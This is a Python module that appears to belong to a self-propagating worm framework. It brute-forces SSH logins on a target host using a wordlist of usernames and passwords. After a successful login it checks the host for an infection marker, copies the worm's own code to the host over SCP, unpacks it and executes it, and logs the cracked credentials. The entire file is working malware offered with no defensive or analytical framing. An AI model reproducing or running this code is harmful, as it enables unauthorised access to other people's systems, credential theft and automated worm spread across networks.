from .abstract import Abstract
import paramiko
from scp import SCPClient
from os.path import exists
import tarfile

class Attaque(Abstract):
    def __init__(self, ref, host, port):
        Abstract.__init__(self, ref, host, port)
    
    def run(self):
        client = paramiko.SSHClient()
        with open("framworm/files/wordlists/rockworm.txt", "r") as wordlist:
            words = wordlist.readlines()
            for user in words:
                user = user.strip()
                for passwd in words:
                    passwd = passwd.strip()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    try:
                        self.info(f"Try to connect with ssh to {self.host}:{self.port} with user={user},password={passwd}")
                        client.connect(self.host, port=self.port, username=user, password=passwd)
                        _, stdout, _ = client.exec_command("""for i in $(ip a | grep "inet " | cut -d' ' -f6 | cut -d'/' -f1); do echo -n $i | sha256sum | cut -d' ' -f1; done | grep $(ls -a /var/tmp/.* | grep "^\.[a-f0-9]" | tr -d ".")""")
                        if stdout.read().decode().strip() == "":
                            with SCPClient(client.get_transport()) as scp:
                                if not exists("/tmp/worm.tar"):
                                    with tarfile.open("/tmp/worm.tar", "w") as tar: tar.add(".")
                                scp.put("/tmp/worm.tar", recursive=True, remote_path="/tmp/w0rm.tar")
                                self.info("/tmp/worm.tar created.")
                            _, stdout, _ = client.exec_command("mkdir /tmp/w0rm; cd /tmp/w0rm; tar xf /tmp/w0rm.tar; python3 main.py")
                            self.bilan(f"ssh_bruteforce{[self.host, user, passwd]}")
                        client.close()
                    except Exception as e:
                        if "Error reading SSH protocol banner" in str(e):
                            return None